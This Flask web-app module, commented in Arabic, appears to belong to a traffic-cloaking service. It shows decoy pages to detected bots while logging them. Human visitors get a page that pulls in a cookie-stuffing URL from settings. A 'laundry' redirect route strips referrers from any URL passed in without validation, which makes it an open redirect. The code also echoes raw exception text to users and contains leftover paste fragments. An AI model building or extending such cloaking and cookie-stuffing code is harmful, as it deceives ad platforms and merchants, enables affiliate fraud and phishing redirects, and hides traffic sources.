import os
from flask import Blueprint, render_template, request, redirect
from pymongo import MongoClient
from app.utils.helpers import is_bot, get_laundry_html
from datetime import datetime

public_bp = Blueprint('public', __name__)

# --- إعداد اتصال قاعدة البيانات (محمي من الأخطاء) ---
def get_db():
    try:
        raw_uri = os.environ.get('MONGO_URI', '').strip()
        if not raw_uri: return None
        client = MongoClient(raw_uri)
        return client['elite_saas_v1']
    except:
        return None

# 1. الصفحة الرئيسية (واجهة الشركة)
@public_bp.route('/')
def home():
    return render_template('home_corporate.html')

# 2. صفحة عرض المقال (المجلة)
# ... (استيراد المكتبات في الأعلى كما هي) ...
# تأكد من استيراد analyze_visitor من helpers
from app.utils.helpers import get_laundry_html, analyze_visitor 

# ... (كود home كما هو) ...

# 2. صفحة عرض المقال (مع نظام التسجيل الجديد)
@public_bp.route('/<category>/<slug>')
def article_view(category, slug):
    try:
        db = get_db()
        if db is None: return "Maintenance", 500

        link = db.links.find_one({"slug": slug})
        if not link: return "404", 404

        # --- 🔥 بداية التحليل والتسجيل 🔥 ---
        ua_string = request.headers.get('User-Agent', '')
        visitor_data = analyze_visitor(ua_string)
        
        # الحالة 1: الزائر بوت (تهديد)
        if visitor_data['is_bot']:
            # تسجيل البوت في سجل الحماية (ليراه العميل)
            db.blocked_logs.insert_one({
                "link_id": link['_id'],
                "owner": link['owner'],
                "bot_name": visitor_data['bot_name'],
                "timestamp": datetime.utcnow()
            })
            # عرض صفحة التمويه
            return f"<h1>News: {link.get('title')}</h1><p>Loading secure content...</p>"

        # الحالة 2: الزائر إنسان (ترافيك)
        # تسجيل الزيارة في سجل التحليلات
        db.visits.insert_one({
            "link_id": link['_id'],
            "owner": link['owner'],
            "os": visitor_data['os'],       # Android/iOS
            "device": visitor_data['device'], # Mobile/Desktop
            "browser": visitor_data['browser'],
            "timestamp": datetime.utcnow()
        })
        
        # زيادة عداد النقرات العام (للسرعة)
        db.links.update_one({"_id": link['_id']}, {"$inc": {"clicks": 1}})

        # --- نهاية التسجيل ---

        # جلب الكوكيز وعرض المجلة (كما كان سابقاً)
        settings = db.settings.find_one({"type": "global"})
        cookie_url = settings.get('stuffing_url', '') if settings else ''

        return render_template(
            'article_magazine.html',
            title=link.get('title', 'News'),
            category=category.upper(),
            date=datetime.utcnow().strftime('%B %d, %Y'),
            target_url=link.get('target_url', '#'),
            cookie_url=cookie_url
        )
    except Exception as e:
        return f"Error: {e}", 500

# 3. الغسالة (الوضع الشبح - Invisible Mode)
@public_bp.route('/redirect')
def redirect_engine():
    # استلام رابط الهدف من الزر
    url = request.args.get('url')
    
    # حماية أساسية
    if not url: return redirect('/')
    
    # --- التعديل الجذري: الوضع الشفاف ---
    # لا نقوم بحقن أي UTM هنا.
    # نترك الرابط كما وضعه العميل بالضبط.
    # مهمتنا فقط هي "مسح المصدر" (Referrer Killing).
    
    return get_laundry_html(url)
